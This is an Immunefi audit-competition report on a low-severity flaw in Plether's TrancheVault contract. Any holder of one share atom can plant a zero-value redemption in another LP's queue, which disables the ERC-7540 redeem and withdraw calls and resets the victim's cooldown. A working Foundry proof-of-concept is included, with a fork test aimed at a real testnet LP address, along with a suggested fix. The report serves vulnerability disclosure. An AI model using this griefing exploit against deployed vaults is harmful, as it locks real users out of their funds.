# \#99348 [SC-Low] Any share holder can disable another LP's ERC-7540 standard claims with a one-atom redemption request

**Submitted on Nov 13th 2026 at 10:07:36 UTC by @krlz for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99348
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol
- **Impacts:**

## Description

## Brief/Intro

Anyone holding one share atom can file a full-balance redemption that names another LP as controller. At settlement it quotes to zero and becomes a refundable head of that LP's redemption queue. The LP's standard `redeem` and `withdraw` then revert and `maxRedeem` and `maxWithdraw` read zero although its own redemption is funded, and removing the planted head restarts the LP's one-hour cooldown on all its wallet shares.

## Vulnerability Details

`requestRedeem(shares, controller, owner)` checks only the owner. The controller is any address and is only recorded:

```solidity
// TrancheVault.sol#L620-L630 (trimmed)
uint256 maxShares = maxRequestRedeem(owner);
_requireMinimumRedeemSize(shares, maxShares);
if (msg.sender != owner && !isOperator[owner][msg.sender]) {
    _spendAllowance(owner, msg.sender, shares);
}
_transfer(owner, address(this), shares);
requestId = _enqueueRedeemRequest(shares, controller);
```

A request for the owner's whole balance is exempt from the 1 USDG minimum (`TrancheVault.sol#L1611-L1618`), so a one-atom balance can be redeemed under any controller:

```solidity
if (estimateRedeemAssets(shares) < POOL.minTrancheDepositAssets() && shares < maxShares) {
    revert TrancheVault__WithdrawalTooSmall();
}
```

At settlement the one-atom epoch quotes to zero assets, and `HousePool` refunds it instead of funding it (`HousePool.sol#L960-L987`). The request stays at the head of the controller's queue, and the standard claim and its view read only that head:

```solidity
// TrancheVault.sol#L1006-L1012, TrancheVault.sol#L1306-L1311
function redeem(uint256 shares, address receiver, address controller) public override returns (uint256 assets) {
    return _claimRedeem(controllerRedeemHead[controller], shares, receiver, controller);
}

function maxRedeem(address controller) public view override returns (uint256) {
    uint256 requestId = controllerRedeemHead[controller];
    return requestId == 0 ? 0 : claimableRedeemRequest(requestId, controller);
}
```

`withdraw` and `maxWithdraw` do the same (`TrancheVault.sol#L998-L1004`, `TrancheVault.sol#L1299-L1304`). The interface confirms that a refundable head "must be cancelled or reclaimed before standard claims advance to a later request" (`IAsyncTrancheVault.sol#L8-L9`), so every later redemption of the LP is out of reach of the standard claims.

Only the LP can remove the head, and removing it restarts its cooldown. `claimRedeemRefund` after settlement delivers the atom to the controller this way, and `cancelRedeemRequest` before settlement does the same (`TrancheVault.sol#L911`):

```solidity
// TrancheVault.sol#L942-L945
if (shares != 0) {
    lastDepositTime[receiver] = block.timestamp;
    _transfer(address(this), receiver, shares);
}
```

For the next hour the LP can neither transfer nor queue for redemption any share in its wallet.

The interface promises the opposite. Cecuro LOW-39 and LOW-40 made claims require `receiver == controller` precisely "so share delivery cannot impose another account's cooldown" (`IAsyncTrancheVault.sol#L12-L14`). Here a third party imposes that cooldown from the request side: it chooses the controller, and the only way to remove its request delivers a share to that controller.

## Impact Details

No funds are frozen, since the explicit-id `claimRedeem` pays the LP at any time. What breaks is the ERC-7540 standard surface the vault advertises (`supportsInterface(0x620ee8e4)`). An integration that claims with `redeem(maxRedeem(controller), …)` cannot reach its funded redemption (9,999.999638 USDG stays in escrow in the PoC), and an LP that clears the unexpected entry with the app's "Return shares to wallet" action locks its wallet shares for an hour. Each plant costs the griefer one share atom, worth zero, and one more atom re-arms it before the LP's next request.

## Recommendation

Withhold the full-balance exemption from requests that name another controller. A third-party request then carries at least the minimum value, its epoch is funded rather than refunded, and the LP clears it with an ordinary claim and no cooldown. With this change the PoC's plant reverts with `TrancheVault__WithdrawalTooSmall`, and the repository's LP tests still pass:

```diff
-        _requireMinimumRedeemSize(shares, maxShares);
+        _requireMinimumRedeemSize(shares, controller == owner ? maxShares : type(uint256).max);
```

## Link to Proof of Concept

https://gist.github.com/KirillZiborov/20ca60b8865fc1a54414eb12a448816a

## Proof of Concept

## Proof of Concept

This Insight matters to any controller that relies on the ERC-7540 standard claims, such as a contract that claims with `redeem(maxRedeem(controller))`, and to app users shown a "Shares ready to return" item they never created. The plant needs an hourly epoch with no other redemption request, and on the live deployment no redemption had been requested on either vault up to block 325381938.

`testLocal` runs in the repository's perps test suite (`BasePerpTest`) with the release risk parameters, through the public vault functions and the Router's `settleLpEpoch`.

1. The victim deposits 10,000 USDG into the Junior vault.
2. The griefer deposits the 1 USDG minimum, waits out the cooldown, keeps one share atom and calls `requestRedeem(1, victim, griefer)`.
3. The victim requests half of its shares in the next epoch, and a keeper settles. The one-atom epoch is refundable, and the victim's redemption is funded with 4,999.999819 USDG.
4. `maxRedeem` and `maxWithdraw` return 0, and `redeem` and `withdraw` revert with `ERC4626ExceededMaxRedeem` and `ERC4626ExceededMaxWithdraw`. `claimRedeem` by id still pays.
5. `claimRedeemRefund` removes the head and restarts the victim's cooldown. For one hour `requestRedeem` and transfers of its wallet shares revert.
6. One more atom from the griefer's second account disables the standard claims again before the victim's next request.

`testControlWithoutThirdPartyRequest` runs the same flow without step 2, and `redeem` pays. `testStandardOnlyIntegrationClaimBlocked` shows a minimal holder that uses only the standard functions unable to claim its funded redemption. `testFork` plants the atom on the live v2.0.0 Senior vault on Arbitrum Sepolia at block 325381938 against the deployment's LP, which holds a 100,000 USDG deposit. Its 50,005.93 USDG redemption is funded while `maxRedeem` is 0 and `redeem` reverts, and removing the head restarts its cooldown.

Save the code as `packages/perps/test/perps/PoC.t.sol` and run `forge test --root packages/perps --match-path test/perps/PoC.t.sol -vv`. The fork test reads `ARBITRUM_SEPOLIA_RPC_URL`.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.35;

import {Test} from "forge-std/Test.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";
import {BasePerpTest} from "./BasePerpTest.sol";
import {ERC4626} from "@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol";
import {IERC20 as OzIERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {CfdEngine} from "@plether/perps/CfdEngine.sol";
import {HousePool} from "@plether/perps/HousePool.sol";
import {MarginClearinghouse} from "@plether/perps/MarginClearinghouse.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

/// @notice The live Plether perps v2.0.0 deployment on Arbitrum Sepolia, forked locally at a pinned block.
/// @dev Addresses and runtime code hashes come from the public release manifest
///      (deployments/releases/2026-10-28-perps-arbitrum-sepolia-v2.0.0). Every in-scope contract is the deployed one;
///      only the Pyth price-update contract is replaced by the repository's own Pyth test double, so that the test can
///      supply price updates. Nothing is broadcast.
abstract contract LivePerpsFork is Test {

    uint256 internal constant FORK_BLOCK = 325_381_938;

    IERC20 internal constant L_USDG = IERC20(0x3d051DbBf5Ff427a4aE8Ad09746902666Af8FB9D);
    MarginClearinghouse internal constant L_CLEARINGHOUSE =
        MarginClearinghouse(0xB5B851f627d6Df3CF3F096E23e20a58884D7b89A);
    CfdEngine internal constant L_ENGINE = CfdEngine(0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA);
    HousePool internal constant L_POOL = HousePool(0xeB5604c393843B2f3c347Ec24Fa9dDaD6Ab2131e);
    PletherOracle internal constant L_ORACLE = PletherOracle(0x4f2c62A0E03657F52C633c19c11f88d8F0897Bb2);
    OrderRouter internal constant L_ROUTER = OrderRouter(0x918663D6Da8CB33b325a04c4A5e8c51D42F3b444);
    address internal constant L_LIFECYCLE_BOOK = 0x327d5fd04e17D96DD5C4F845A0b4256A9e19645C;
    address internal constant L_PROTECTION_BOOK = 0x81E3b03Cf29865b6c0f85925839567e2Bc61073D;
    address internal constant L_PYTH = 0x0B73614636C855Bf23F342F307FB981A3e47f42B;

    /// @dev Arbitrum's L2 block number, which the Router reads from the ArbSys precompile for its same-block rule.
    uint256 internal arbBlock;

    bytes32[] internal liveFeedIds;
    int64[] internal livePrices;
    uint64[] internal liveConfs;
    int32[] internal liveExpos;

    /// @dev Forks the live deployment, checks that the deployed code is the released (audited) build, records the
    ///      live Pyth prices of the six basket feeds, then installs the Pyth test double at the Pyth address.
    function _selectLiveFork() internal {
        vm.createSelectFork(vm.envString("ARBITRUM_SEPOLIA_RPC_URL"), FORK_BLOCK);
        assertEq(block.chainid, 421_614, "Arbitrum Sepolia");
        assertEq(address(L_USDG).codehash, 0x12233a5f6b0abf6a0f8447e56f9507afdd142a78cc42ebb0d041a3997bd299f6);
        assertEq(address(L_CLEARINGHOUSE).codehash, 0xc8e4965893dbd7073303303e9d5ab9c775aabcc1259635e4993fc7fdb0681398);
        assertEq(address(L_ENGINE).codehash, 0xa0f8e5be6e622a5a83e46e88f6b012757ef924cf613a50cba52a2b5c66b76a6b);
        assertEq(address(L_POOL).codehash, 0x5e684cc82bfc5b697a24c80ef26910cfbe25efbe6fb2ca184c421808b5ced957);
        assertEq(address(L_ORACLE).codehash, 0x1ecb1ca760e7ba51d958697eeefe06ff7ba1a3ad162b3e7978af3df30393bc13);
        assertEq(address(L_ROUTER).codehash, 0x6c65de67ef2824572537e3641a71100100c49d909b196c43e5d271312534d3cf);
        assertEq(L_LIFECYCLE_BOOK.codehash, 0xc3f34d5c32716e1818e1ae1cf5e14892a639bc35f15894610e619afe648ba554);
        assertEq(L_PROTECTION_BOOK.codehash, 0xe15987a99e503d6bbd5d871090b9bfea06383bb37fa7af8dfd9cf457fdc4eed5);
        assertEq(
            L_ROUTER.executionSidecar().codehash, 0xfc72fcbe4496d0d5356e96d259536cd4edcb926dd7fe1473a4275ddfb09cb57e
        );
        assertEq(
            L_ROUTER.liquidationBatchSidecar().codehash,
            0x8420be926293c70a880b5f12c07674861563727a04aca954323004855807c8f7
        );
        assertEq(address(L_ROUTER.pletherOracle()), address(L_ORACLE), "router oracle");
        assertEq(address(L_ORACLE.pyth()), L_PYTH, "oracle pyth");

        for (uint256 i; i < 6; ++i) {
            bytes32 id = L_ORACLE.pythFeedIds(i);
            (bool ok, bytes memory ret) = L_PYTH.staticcall(abi.encodeWithSignature("getPriceUnsafe(bytes32)", id));
            require(ok, "live pyth read");
            (int64 price, uint64 conf, int32 expo,) = abi.decode(ret, (int64, uint64, int32, uint256));
            liveFeedIds.push(id);
            livePrices.push(price);
            liveConfs.push(conf);
            liveExpos.push(expo);
        }

        MockPyth double = new MockPyth();
        vm.etch(L_PYTH, address(double).code);
        // The double's own scalar state lives in slots 0..11; clear what the real Pyth proxy kept there.
        for (uint256 slot; slot < 12; ++slot) {
            vm.store(L_PYTH, bytes32(slot), bytes32(0));
        }
        for (uint256 i; i < 6; ++i) {
            MockPyth(L_PYTH).setPrice(liveFeedIds[i], livePrices[i], liveConfs[i], liveExpos[i], vm.getBlockTimestamp() - 60);
        }
        arbBlock = FORK_BLOCK;
        _mockArbBlock();
    }

    /// @dev The local fork has no ArbSys precompile behaviour that advances with the test's blocks; serve the L2 block
    ///      number that the test advances, one per step.
    function _mockArbBlock() internal {
        vm.mockCall(address(100), abi.encodeWithSignature("arbBlockNumber()"), abi.encode(arbBlock));
    }

    /// @dev A Pyth update carrying the live prices of the six basket feeds at the given publish time.
    function _feedUpdates(
        uint64 publishTime,
        uint64 prevPublishTime
    ) internal view returns (MockPyth.FeedUpdate[] memory updates) {
        updates = new MockPyth.FeedUpdate[](6);
        for (uint256 i; i < 6; ++i) {
            updates[i] = MockPyth.FeedUpdate(
                liveFeedIds[i],
                MockPyth.MockPrice(livePrices[i], liveConfs[i], liveExpos[i], publishTime, prevPublishTime)
            );
        }
    }

    function _livePayload(
        uint64 publishTime,
        uint64 prevPublishTime
    ) internal view returns (bytes[] memory data) {
        data = new bytes[](1);
        data[0] = abi.encode(_feedUpdates(publishTime, prevPublishTime));
    }

}

contract ThirdPartyRefundHeadLocal is BasePerpTest {
    address internal constant VICTIM = address(0xA11CE);
    address internal constant GRIEFER = address(0xBAD);
    address internal constant GRIEFER_STASH = address(0xBAD2);
    address internal constant OTHER = address(0x0123);

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8000);
        vm.label(VICTIM, "victim-lp");
        vm.label(GRIEFER, "griefer");
        vm.label(GRIEFER_STASH, "griefer-stash");
    }

    // ------------------------------------------------------------------ helpers (public paths only)

    function _settleAt(
        uint256 timestamp
    ) internal {
        if (block.timestamp < timestamp) {
            vm.warp(timestamp);
        }
        router.settleLpEpoch(_mockPythUpdateData(1e8));
    }

    /// An LP deposit through the public request / hourly settlement / claim flow.
    function _lpDeposit(
        address lp,
        uint256 assets
    ) internal returns (uint256 requestId, uint256 shares) {
        settlementToken.mint(lp, assets);
        vm.startPrank(lp);
        settlementToken.approve(address(juniorVault), assets);
        requestId = juniorVault.requestDeposit(assets, lp, lp);
        vm.stopPrank();
        _settleAt(juniorVault.depositEpochStart(requestId));
        vm.prank(lp);
        shares = juniorVault.claimDeposit(requestId, assets, lp, lp);
    }

    /// The victim and the griefer hold Junior shares past their cooldowns; the griefer keeps exactly one share atom.
    function _prepare() internal returns (uint256 victimShares) {
        (, victimShares) = _lpDeposit(VICTIM, 10_000e6);
        (, uint256 grieferShares) = _lpDeposit(GRIEFER, 1e6); // the minimum deposit
        vm.warp(block.timestamp + juniorVault.DEPOSIT_COOLDOWN());
        vm.prank(GRIEFER);
        juniorVault.transfer(GRIEFER_STASH, grieferShares - 1);
        assertEq(juniorVault.balanceOf(GRIEFER), 1, "the griefer holds one share atom");
    }

    /// The victim requests to redeem half of its shares just after the request cutoff of `afterEpoch`, so its request
    /// lands in the next hourly epoch; then a keeper settles that epoch.
    function _victimRedeemsAfter(
        uint256 afterEpoch,
        uint256 shares
    ) internal returns (uint256 ownId) {
        vm.warp(juniorVault.depositEpochStart(afterEpoch) - juniorVault.LP_REQUEST_CUTOFF_DURATION());
        vm.prank(VICTIM);
        ownId = juniorVault.requestRedeem(shares, VICTIM, VICTIM);
        assertEq(ownId, afterEpoch + 1, "the victim's request is in the next hourly epoch");
        _settleAt(juniorVault.depositEpochStart(ownId));
    }

    // ------------------------------------------------------------------ tests

    /// Without the third-party request, the victim's standard ERC-7540 claim pays its funded redemption.
    function testControlWithoutThirdPartyRequest() public {
        uint256 victimShares = _prepare();
        uint256 exitShares = victimShares / 2;
        (uint256 epochNow,) = juniorVault.getRequestEpochWindow();
        uint256 ownId = _victimRedeemsAfter(epochNow, exitShares);
        uint256 funded = juniorVault.claimableRedeemAssets(ownId, VICTIM);
        assertEq(juniorVault.maxRedeem(VICTIM), exitShares, "maxRedeem shows the funded request");
        uint256 usdgBefore = settlementToken.balanceOf(VICTIM);
        vm.prank(VICTIM);
        uint256 paid = juniorVault.redeem(exitShares, VICTIM, VICTIM);
        emit log_named_decimal_uint("control: standard redeem pays (USDG)", paid, 6);
        assertEq(paid, funded, "standard claim pays the funded amount");
        assertEq(settlementToken.balanceOf(VICTIM) - usdgBefore, funded, "victim received its USDG");
    }

    /// The griefer's one-atom request disables the victim's standard claims; clearing it restarts the victim's cooldown.
    function testLocal() public {
        uint256 victimShares = _prepare();
        uint256 exitShares = victimShares / 2;
        emit log_named_uint("value of the griefer's one share atom (USDG atoms)", juniorVault.convertToAssets(1));

        // 1. The griefer files a full-balance redemption of one share atom naming the victim as controller.
        vm.prank(GRIEFER);
        uint256 dustId = juniorVault.requestRedeem(1, VICTIM, GRIEFER);
        assertEq(juniorVault.controllerRedeemHead(VICTIM), dustId, "the dust request heads the victim's queue");
        assertEq(juniorVault.balanceOf(GRIEFER), 0, "the griefer spent its one atom");

        // 2. The victim requests its own redemption in a later epoch; 3. a keeper settles both epochs.
        uint256 ownId = _victimRedeemsAfter(dustId, exitShares);
        assertTrue(juniorVault.redeemRefundPending(dustId, VICTIM), "the dust epoch quoted to zero and is refundable");
        assertEq(juniorVault.refundableRedeemRequest(dustId, VICTIM), 1, "one atom refundable to the victim");
        uint256 fundedShares = juniorVault.claimableRedeemRequest(ownId, VICTIM);
        uint256 fundedAssets = juniorVault.claimableRedeemAssets(ownId, VICTIM);
        emit log_named_decimal_uint("victim's own redemption, funded and claimable (USDG)", fundedAssets, 6);
        assertEq(fundedShares, exitShares, "the victim's own request is fully funded");
        assertGt(fundedAssets, 4_900e6, "about 5,000 USDG claimable");

        // 4. The standard ERC-7540 claim surface reads zero and reverts for the victim.
        assertEq(juniorVault.maxRedeem(VICTIM), 0, "maxRedeem reads zero");
        assertEq(juniorVault.maxWithdraw(VICTIM), 0, "maxWithdraw reads zero");
        vm.prank(VICTIM);
        vm.expectRevert(abi.encodeWithSelector(ERC4626.ERC4626ExceededMaxRedeem.selector, VICTIM, exitShares, 0));
        juniorVault.redeem(exitShares, VICTIM, VICTIM);
        vm.prank(VICTIM);
        vm.expectRevert(abi.encodeWithSelector(ERC4626.ERC4626ExceededMaxWithdraw.selector, VICTIM, fundedAssets, 0));
        juniorVault.withdraw(fundedAssets, VICTIM, VICTIM);

        // The explicit-id claim is not affected: the funded USDG is reachable without touching the head.
        uint256 snap = vm.snapshotState();
        vm.prank(VICTIM);
        uint256 paidById = juniorVault.claimRedeem(ownId, exitShares, VICTIM, VICTIM);
        assertEq(paidById, fundedAssets, "explicit-id claim pays in full");
        assertEq(juniorVault.controllerRedeemHead(VICTIM), dustId, "the dust head stays in place");
        assertEq(juniorVault.maxRedeem(VICTIM), 0, "and keeps the standard surface at zero");
        vm.revertToState(snap);

        // 5. After settlement, the call that removes the head delivers the atom to the victim and restarts its cooldown.
        uint256 walletShares = juniorVault.balanceOf(VICTIM);
        vm.prank(VICTIM);
        uint256 returned = juniorVault.claimRedeemRefund(dustId, VICTIM, VICTIM);
        uint256 clearedAt = block.timestamp;
        assertEq(returned, 1, "one atom returned");
        assertEq(juniorVault.lastDepositTime(VICTIM), clearedAt, "the victim's cooldown restarts");
        assertEq(juniorVault.maxRequestRedeem(VICTIM), 0, "no wallet share can be queued for redemption");
        vm.prank(VICTIM);
        vm.expectRevert(TrancheVault.TrancheVault__DepositCooldown.selector);
        juniorVault.requestRedeem(walletShares + 1, VICTIM, VICTIM);
        vm.prank(VICTIM);
        vm.expectRevert(TrancheVault.TrancheVault__TransferDuringCooldown.selector);
        juniorVault.transfer(OTHER, walletShares);
        emit log_named_decimal_uint("victim wallet shares locked by the restart", walletShares + 1, 9);

        // The standard claim works again once the head is gone.
        vm.prank(VICTIM);
        assertEq(juniorVault.redeem(exitShares, VICTIM, VICTIM), fundedAssets, "standard claim after clearing");

        // 6. The griefer re-arms for one more atom from its stash, ahead of the victim's next request.
        vm.prank(GRIEFER_STASH);
        juniorVault.transfer(GRIEFER, 1);
        vm.prank(GRIEFER);
        uint256 dustId2 = juniorVault.requestRedeem(1, VICTIM, GRIEFER);

        // The lock lasts the full hour: one second before it ends the victim still cannot queue a redemption.
        vm.warp(clearedAt + juniorVault.DEPOSIT_COOLDOWN() - 1);
        vm.prank(VICTIM);
        vm.expectRevert(TrancheVault.TrancheVault__DepositCooldown.selector);
        juniorVault.requestRedeem(walletShares + 1, VICTIM, VICTIM);
        vm.warp(clearedAt + juniorVault.DEPOSIT_COOLDOWN());
        uint256 rest = juniorVault.balanceOf(VICTIM);
        uint256 window = juniorVault.depositEpochStart(dustId2) - juniorVault.LP_REQUEST_CUTOFF_DURATION();
        if (block.timestamp < window) {
            vm.warp(window);
        }
        vm.prank(VICTIM);
        uint256 ownId2 = juniorVault.requestRedeem(rest, VICTIM, VICTIM);
        assertGt(ownId2, dustId2, "the victim's next request is behind the new dust head");
        _settleAt(juniorVault.depositEpochStart(ownId2));
        assertGt(juniorVault.claimableRedeemAssets(ownId2, VICTIM), 0, "next redemption funded");
        assertEq(juniorVault.maxRedeem(VICTIM), 0, "standard surface disabled again, for one more atom");
    }

    /// An integration that uses only the ERC-7540 standard functions (request, then claim maxRedeem through redeem)
    /// cannot claim its funded redemption once a third party has planted a refundable head in its queue.
    function testStandardOnlyIntegrationClaimBlocked() public {
        assertTrue(juniorVault.supportsInterface(0x620ee8e4), "the vault advertises ERC-7540 async redeem");
        StandardErc7540Holder holder =
            new StandardErc7540Holder(juniorVault, OzIERC20(address(settlementToken)));
        settlementToken.mint(address(holder), 10_000e6);
        uint256 depositId = holder.requestDeposit(10_000e6);
        _settleAt(juniorVault.depositEpochStart(depositId));
        uint256 holderShares = holder.claimDeposit();
        (, uint256 grieferShares) = _lpDeposit(GRIEFER, 1e6);
        vm.warp(block.timestamp + juniorVault.DEPOSIT_COOLDOWN());
        vm.prank(GRIEFER);
        juniorVault.transfer(GRIEFER_STASH, grieferShares - 1);

        vm.prank(GRIEFER);
        uint256 dustId = juniorVault.requestRedeem(1, address(holder), GRIEFER);
        vm.warp(juniorVault.depositEpochStart(dustId) - juniorVault.LP_REQUEST_CUTOFF_DURATION());
        uint256 ownId = holder.requestRedeem(holderShares);
        _settleAt(juniorVault.depositEpochStart(ownId));

        uint256 funded = juniorVault.claimableRedeemAssets(ownId, address(holder));
        emit log_named_decimal_uint("integration's funded redemption held in vault escrow (USDG)", funded, 6);
        assertGt(funded, 9_900e6, "about 10,000 USDG funded");
        vm.expectRevert(abi.encodeWithSelector(ERC4626.ERC4626ExceededMaxRedeem.selector, address(holder), 0, 0));
        holder.claimRedeem(address(holder));
        assertEq(settlementToken.balanceOf(address(holder)), 0, "nothing reached the integration");
    }
}

/// A minimal integration that holds tranche shares through the ERC-7540 standard surface only.
contract StandardErc7540Holder {
    TrancheVault internal immutable vault;
    OzIERC20 internal immutable usdg;

    constructor(
        TrancheVault vault_,
        OzIERC20 usdg_
    ) {
        vault = vault_;
        usdg = usdg_;
    }

    function requestDeposit(
        uint256 assets
    ) external returns (uint256) {
        usdg.approve(address(vault), assets);
        return vault.requestDeposit(assets, address(this), address(this));
    }

    function claimDeposit() external returns (uint256) {
        return vault.deposit(vault.maxDeposit(address(this)), address(this));
    }

    function requestRedeem(
        uint256 shares
    ) external returns (uint256) {
        return vault.requestRedeem(shares, address(this), address(this));
    }

    function claimRedeem(
        address receiver
    ) external returns (uint256) {
        return vault.redeem(vault.maxRedeem(address(this)), receiver, address(this));
    }
}

/// The same planted refundable head on the live deployment's Senior vault, naming the deployment's only LP that is not
/// the operator account, and the cooldown restart that its removal imposes.
contract ThirdPartyRefundHeadFork is LivePerpsFork {
    TrancheVault internal constant L_SENIOR = TrancheVault(0x5Dc42Ba5a1E8DD3E1B6868D10f66A9bf8Fb5B83d);
    TrancheVault internal constant L_JUNIOR = TrancheVault(0x4A8b67184a1E3224c11A191cc69F22C50EEf734e);
    /// The only LP of the live deployment other than the operator account: a finalized, unclaimed 100,000 USDG Senior
    /// deposit (epoch 498224).
    address internal constant LIVE_LP = 0xd3aAa8497F5bC2FE044293E3A9D13102eDE3CF90;
    uint256 internal constant LIVE_LP_DEPOSIT_EPOCH = 498_224;
    address internal constant GRIEFER = address(0xBAD);
    address internal constant GRIEFER_STASH = address(0xBAD2);

    function _warpTo(
        uint256 timestamp
    ) internal {
        vm.warp(timestamp);
        vm.roll(vm.getBlockNumber() + 1);
        ++arbBlock;
        _mockArbBlock();
    }

    function _liveSettle() internal {
        uint64 nowTs = uint64(vm.getBlockTimestamp());
        L_ROUTER.settleLpEpoch(_livePayload(nowTs, nowTs - 1));
    }

    function testFork() public {
        _selectLiveFork();
        vm.label(LIVE_LP, "live-senior-lp");
        vm.label(GRIEFER, "griefer");

        // Census of the live state at the pinned block.
        assertEq(LIVE_LP.code.length, 0, "the live LP is a plain account");
        assertEq(
            L_SENIOR.claimableDepositRequest(LIVE_LP_DEPOSIT_EPOCH, LIVE_LP), 100_000e6, "live LP's activated deposit"
        );
        assertEq(L_SENIOR.pendingRedeemEscrowShares(), 0, "no Senior redemption pending");
        assertEq(L_JUNIOR.pendingRedeemEscrowShares(), 0, "no Junior redemption pending");
        assertEq(L_SENIOR.controllerRedeemHead(LIVE_LP), 0, "the live LP has no redemption queue yet");
        assertTrue(L_SENIOR.seedReceiver() != address(0), "redemptions enabled (seed receiver set)");
        assertEq(L_POOL.minTrancheDepositAssets(), 1e6, "minimum deposit 1 USDG");

        // The griefer obtains Senior shares with the minimum deposit, through the public flow.
        deal(address(L_USDG), GRIEFER, 1e6);
        vm.startPrank(GRIEFER);
        L_USDG.approve(address(L_SENIOR), 1e6);
        uint256 grieferDepositId = L_SENIOR.requestDeposit(1e6, GRIEFER, GRIEFER);
        vm.stopPrank();
        _warpTo(L_SENIOR.depositEpochStart(grieferDepositId) + 5);
        _liveSettle();
        vm.prank(GRIEFER);
        uint256 grieferShares = L_SENIOR.claimDeposit(grieferDepositId, 1e6, GRIEFER, GRIEFER);
        _warpTo(vm.getBlockTimestamp() + L_SENIOR.DEPOSIT_COOLDOWN() + 5);
        vm.prank(GRIEFER);
        L_SENIOR.transfer(GRIEFER_STASH, grieferShares - 1);

        // 1. One share atom, full balance, named for the live LP.
        vm.prank(GRIEFER);
        uint256 dustId = L_SENIOR.requestRedeem(1, LIVE_LP, GRIEFER);
        assertEq(L_SENIOR.controllerRedeemHead(LIVE_LP), dustId, "dust heads the live LP's queue");

        // 2. The live LP claims its activated deposit with the standard call and later requests half of it back.
        vm.prank(LIVE_LP);
        uint256 lpShares = L_SENIOR.deposit(100_000e6, LIVE_LP);
        uint256 exitShares = lpShares / 2;
        _warpTo(L_SENIOR.depositEpochStart(dustId) - L_SENIOR.LP_REQUEST_CUTOFF_DURATION());
        vm.prank(LIVE_LP);
        uint256 ownId = L_SENIOR.requestRedeem(exitShares, LIVE_LP, LIVE_LP);
        assertEq(ownId, dustId + 1, "own request one epoch later");

        // 3. A keeper settles.
        _warpTo(L_SENIOR.depositEpochStart(ownId) + 5);
        _liveSettle();
        assertTrue(L_SENIOR.redeemRefundPending(dustId, LIVE_LP), "dust epoch refundable");
        uint256 fundedAssets = L_SENIOR.claimableRedeemAssets(ownId, LIVE_LP);
        emit log_named_decimal_uint("live LP's funded Senior redemption (USDG)", fundedAssets, 6);
        assertEq(L_SENIOR.claimableRedeemRequest(ownId, LIVE_LP), exitShares, "own request fully funded");
        assertGt(fundedAssets, 49_000e6, "about 50,000 USDG claimable");

        // 4. Standard claims read zero and revert.
        assertEq(L_SENIOR.maxRedeem(LIVE_LP), 0, "maxRedeem zero");
        assertEq(L_SENIOR.maxWithdraw(LIVE_LP), 0, "maxWithdraw zero");
        vm.prank(LIVE_LP);
        vm.expectRevert(abi.encodeWithSelector(ERC4626.ERC4626ExceededMaxRedeem.selector, LIVE_LP, exitShares, 0));
        L_SENIOR.redeem(exitShares, LIVE_LP, LIVE_LP);

        // 5. Removing the head restarts the live LP's cooldown on its remaining Senior shares.
        uint256 walletShares = L_SENIOR.balanceOf(LIVE_LP);
        vm.prank(LIVE_LP);
        assertEq(L_SENIOR.claimRedeemRefund(dustId, LIVE_LP, LIVE_LP), 1, "one atom returned");
        assertEq(L_SENIOR.lastDepositTime(LIVE_LP), vm.getBlockTimestamp(), "cooldown restarted");
        vm.prank(LIVE_LP);
        vm.expectRevert(TrancheVault.TrancheVault__DepositCooldown.selector);
        L_SENIOR.requestRedeem(walletShares + 1, LIVE_LP, LIVE_LP);
        emit log_named_decimal_uint("live LP's wallet Senior shares locked for one hour", walletShares + 1, 9);

        // The explicit-id claim was available throughout.
        vm.prank(LIVE_LP);
        assertEq(L_SENIOR.claimRedeem(ownId, exitShares, LIVE_LP, LIVE_LP), fundedAssets, "explicit-id claim pays");
    }
}
```
